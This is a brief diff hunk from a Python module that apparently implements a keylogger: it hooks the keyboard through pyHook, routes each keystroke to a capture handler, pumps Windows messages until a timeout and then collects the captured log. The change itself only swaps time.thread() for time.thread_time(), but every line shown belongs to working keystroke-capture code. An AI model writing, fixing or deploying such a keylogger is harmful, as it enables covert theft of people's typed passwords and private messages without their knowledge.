@@ -62,7 +62,7 @@ def run():
     hm.KeyDown = kl.mykeystroke
     hm.HookKeyboard()
 
-    while time.thread() < TIMEOUT:
+    while time.thread_time() < TIMEOUT:
         pythoncom.PumpWaitingMessages()
 
     log = sys.stdout.getvalue()
